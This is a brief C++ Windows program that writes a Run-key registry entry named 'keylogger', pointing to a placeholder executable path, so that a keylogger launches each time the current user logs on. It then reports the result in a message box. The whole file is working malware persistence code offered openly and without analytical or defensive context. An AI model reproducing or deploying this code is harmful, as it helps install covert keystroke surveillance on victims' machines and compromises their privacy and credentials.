#include <Windows.h>
#include <string>

int main() {
    HKEY hkey = NULL;
    // Use a wide string (L"") for Unicode compatibility
    const wchar_t* keyloggerFile = L"<replace with the path to your executable>";

    // Use wide string for the registry path
    LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hkey);

    if (res == ERROR_SUCCESS) {
        // Set the registry value using wide strings
        res = RegSetValueEx(hkey, L"keylogger", 0, REG_SZ, (const BYTE*)keyloggerFile, (wcslen(keyloggerFile) + 1) * sizeof(wchar_t));

        if (res == ERROR_SUCCESS) {
            MessageBox(NULL, L"Registry key added successfully!", L"Success", MB_OK);
        }
        else {
            MessageBox(NULL, L"Failed to set registry value.", L"Error", MB_ICONERROR);
        }

        // Close the registry key handle
        RegCloseKey(hkey);
    }
    else {
        MessageBox(NULL, L"Failed to open registry key.", L"Error", MB_ICONERROR);
    }

    return 0;
}